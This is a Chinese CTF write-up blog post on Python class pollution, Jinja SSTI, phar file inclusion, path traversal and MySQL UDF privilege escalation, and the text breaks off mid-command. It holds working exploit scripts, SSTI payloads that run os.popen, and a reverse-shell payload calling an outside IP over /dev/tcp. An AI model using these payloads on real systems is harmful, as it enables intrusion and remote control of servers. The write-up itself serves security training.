{"title":"赛题总结2","uid":"442c6fcbd30c196cf34836f1e603185c","slug":"赛题总结2","date":"2024-10-31T08:30:56.000Z","updated":"2024-10-31T08:43:54.049Z","comments":true,"path":"api/articles/赛题总结2.json","keywords":null,"cover":"/image/12.png","content":"<h1 id=\"原型链污染\"><a href=\"#原型链污染\" class=\"headerlink\" title=\"原型链污染\"></a>原型链污染</h1><h2 id=\"python原型链污染\"><a href=\"#python原型链污染\" class=\"headerlink\" title=\"python原型链污染\"></a>python原型链污染</h2><h3 id=\"Jinja-Mark\"><a href=\"#Jinja-Mark\" class=\"headerlink\" title=\"Jinja Mark\"></a>Jinja Mark</h3><blockquote>\n<p>python原型链污染例子</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">demo</span>():</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">B</span>:</span><br><span class=\"line\">    classa = <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">instance = A()</span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;a&quot;</span>: <span class=\"number\">4</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;B&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;classa&quot;</span>: <span class=\"number\">5</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(B.classa)  <span class=\"comment\"># 2</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)         <span class=\"comment\"># 1</span></span><br><span class=\"line\">merge(payload, instance)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(B.classa)  <span class=\"comment\"># 5</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)         <span class=\"comment\"># 4</span></span><br></pre></td></tr></table></figure>\n\n<p>参考文章<a href=\"https://xz.aliyun.com/t/13072#toc-13\">https://xz.aliyun.com/t/13072#toc-13</a></p>\n<h3 id=\"绕过黑名单\"><a href=\"#绕过黑名单\" class=\"headerlink\" title=\"绕过黑名单\"></a>绕过黑名单</h3><p>进入到&#x2F;index <strong>进行ssti注入发现有黑名单</strong>，查看提示发现是</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BLACKLIST_IN_index = [<span class=\"string\">&#x27;&#123;&#x27;</span>,<span class=\"string\">&#x27;&#125;&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/magic&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>, <span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pollute</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.is_json:</span><br><span class=\"line\">            merge(json.loads(request.data), instance)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;这个魔术还行吧&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;我要json的魔术&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;记得用POST方法把魔术交上来&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>需要将黑名单ban掉，<strong>将payload以json的格式通过POST传入 &#x2F;magic</strong> exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建要发送的 payload</span></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__class__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 payload 转换为 JSON 格式</span></span><br><span class=\"line\">json_payload = json.dumps(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 URL</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://gz.imxbt.cn:20155/magic&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印请求的键和值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 URL:&quot;</span>, url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的头部信息:&quot;</span>, &#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 Payload:&quot;</span>, json_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 发送 POST 请求</span></span><br><span class=\"line\">    response = requests.post(url, data=json_payload, headers=&#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印响应内容</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;状态码:&quot;</span>, response.status_code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;响应内容:&quot;</span>, response.text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> requests.exceptions.RequestException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求发生错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;BLACKLIST_IN_index&quot;</span>: []</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发送响应的json字符串</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%932/image-20241014155227175.png\"></p>\n<h3 id=\"SSTI注入\"><a href=\"#SSTI注入\" class=\"headerlink\" title=\"SSTI注入\"></a>SSTI注入</h3><p>再次进行ssti注入发现无黑名单</p>\n<p>最终payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; </span><br><span class=\"line\">&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"特殊变量与原型链污染的关系\"><a href=\"#特殊变量与原型链污染的关系\" class=\"headerlink\" title=\"特殊变量与原型链污染的关系\"></a>特殊变量与原型链污染的关系</h2><h3 id=\"圣钥之战1-0\"><a href=\"#圣钥之战1-0\" class=\"headerlink\" title=\"圣钥之战1.0\"></a>圣钥之战1.0</h3><p>在&#x2F;read路由下看到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,request</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">src, dst</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> src.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(dst, <span class=\"string\">&#x27;__getitem__&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> dst.get(k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">                merge(v, dst.get(k))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                dst[k] = v</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">hasattr</span>(dst, k) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">            merge(v, <span class=\"built_in\">getattr</span>(dst, k))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">setattr</span>(dst, k, v)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">is_json</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        json.loads(data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">cls</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">instance = cls()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello_world</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;/static/index.html&#x27;</span>, encoding=<span class=\"string\">&quot;utf-8&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/read&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Read</span>():</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(__file__, encoding=<span class=\"string\">&quot;utf-8&quot;</span>).read()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">f&quot;J1ngHong说：你想read flag吗？</span></span><br><span class=\"line\"><span class=\"string\">那么圣钥之光必将阻止你！</span></span><br><span class=\"line\"><span class=\"string\">但是小小的源码没事，因为你也读不到flag(乐)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">&#123;file&#125;</span></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/pollute&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Pollution</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.is_json:</span><br><span class=\"line\">        merge(json.loads(request.data),instance)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>看到&#x2F;read路由是通过<code>__file__</code>来读取文件，<code>__file__</code>的值可以通过merge来修改，直接构造payload</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建要发送的 payload</span></span><br><span class=\"line\">payload = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;__init__&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;__globals__&quot;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;__file__&quot;</span>: <span class=\"string\">&quot;flag&quot;</span> <span class=\"comment\">#/proc/1/environ</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 payload 转换为 JSON 格式</span></span><br><span class=\"line\">json_payload = json.dumps(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义 URL</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://gz.imxbt.cn:20199/pollute&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印请求的键和值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 URL:&quot;</span>, url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的头部信息:&quot;</span>, &#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求的 Payload:&quot;</span>, json_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 发送 POST 请求</span></span><br><span class=\"line\">    response = requests.post(url, data=json_payload, headers=&#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印响应内容</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;状态码:&quot;</span>, response.status_code)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;响应内容:&quot;</span>, response.text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> requests.exceptions.RequestException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请求发生错误:&quot;</span>, e)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>再次访问&#x2F;read即可</p>\n<p><code>/proc/1/environ 文件用于存放进程 ID 为 1 的进程（通常是 init 或 systemd）的环境变量。该文件包含了一系列以空字符 (\\0) 分隔的环境变量，这些变量在进程启动时被设置</code></p>\n<h1 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h1><h2 id=\"文件包含phar\"><a href=\"#文件包含phar\" class=\"headerlink\" title=\"文件包含phar\"></a>文件包含phar</h2><h3 id=\"NISACTF-2022-bingdundun\"><a href=\"#NISACTF-2022-bingdundun\" class=\"headerlink\" title=\"NISACTF 2022 bingdundun~\"></a>NISACTF 2022 bingdundun~</h3><p><strong>例题</strong></p>\n<p><a href=\"https://www.nssctf.cn/problem/2026\">https://www.nssctf.cn/problem/2026</a> </p>\n<p>将shell压缩成zip进行上传</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%932/image-20240531151621977.png\" alt=\"image-20240531151621977\"></p>\n<p>上传之后用<strong>phar伪协议</strong>来<strong>解压出</strong>该文件中的<strong>内容</strong></p>\n<p>最终payload:</p>\n<p>GET:  <strong>?bingdundun&#x3D;phar:&#x2F;&#x2F;494ff243b2fc65c01462174e09e95088.zip&#x2F;web</strong></p>\n<p><strong>连接蚁剑即可</strong></p>\n<h2 id=\"babyupload\"><a href=\"#babyupload\" class=\"headerlink\" title=\"babyupload\"></a>babyupload</h2><h3 id=\"CVE-2020-35736\"><a href=\"#CVE-2020-35736\" class=\"headerlink\" title=\"CVE-2020-35736\"></a>CVE-2020-35736</h3><h3 id=\"利用-os-path-join-处理路径的拼接问题\"><a href=\"#利用-os-path-join-处理路径的拼接问题\" class=\"headerlink\" title=\"利用 os.path.join 处理路径的拼接问题\"></a>利用 os.path.join 处理路径的拼接问题</h3><p> <a href=\"https://www.nssctf.cn/problem/2025\">https://www.nssctf.cn/problem/2025</a></p>\n<p> <code>file_path = os.path.join(&quot;var&quot;, &quot;lib&quot;, filename)</code></p>\n<p>传入文件会自动拼接**&#x2F;var&#x2F;lib&#x2F;$filename** </p>\n<p>如果变量名前有**&#x2F;<strong>，os.path.join会</strong>忽略掉var&#x2F;lib** </p>\n<p>eg:</p>\n<p>$filename&#x3D;<strong>&#x2F;flag</strong> </p>\n<p>读取路径为&#x2F;flag (<strong>直接读取根目录的flag isset</strong>)</p>\n<h3 id=\"babyserialize\"><a href=\"#babyserialize\" class=\"headerlink\" title=\"babyserialize\"></a>babyserialize</h3><h4 id=\"pop-4对象\"><a href=\"#pop-4对象\" class=\"headerlink\" title=\"pop 4对象\"></a>pop 4对象</h4><p> <a href=\"https://www.nssctf.cn/problem/1852\">https://www.nssctf.cn/problem/1852</a></p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><h2 id=\"直接fenjing一把梭\"><a href=\"#直接fenjing一把梭\" class=\"headerlink\" title=\"直接fenjing一把梭\"></a>直接fenjing一把梭</h2><h3 id=\"2024年春秋杯网络安全联赛夏季赛-brother\"><a href=\"#2024年春秋杯网络安全联赛夏季赛-brother\" class=\"headerlink\" title=\"2024年春秋杯网络安全联赛夏季赛 brother\"></a>2024年春秋杯网络安全联赛夏季赛 brother</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/8888 0&gt;&amp;1&#x27;&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>进行反弹shell到服务器上</p>\n<h3 id=\"UDF提权\"><a href=\"#UDF提权\" class=\"headerlink\" title=\"UDF提权\"></a>UDF提权</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /flag  <span class=\"comment\">#发现权限不够</span></span><br><span class=\"line\"></span><br><span class=\"line\">ss -tuln   <span class=\"comment\">#查看端口</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> api.py <span class=\"comment\">#发现mysql用户和密码</span></span><br></pre></td></tr></table></figure>\n\n<p>发现<strong>6666开启mysql服务</strong></p>\n<p>可以尝试进行<strong>UDF提权</strong></p>\n<p>服务器开启http服务</p>\n<p>将lib_mysqludf_sys_64.so文件传输到靶机上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select @@version_compile_os, @@version_compile_machine;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;show variables like &#x27;%plugin%&#x27;;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 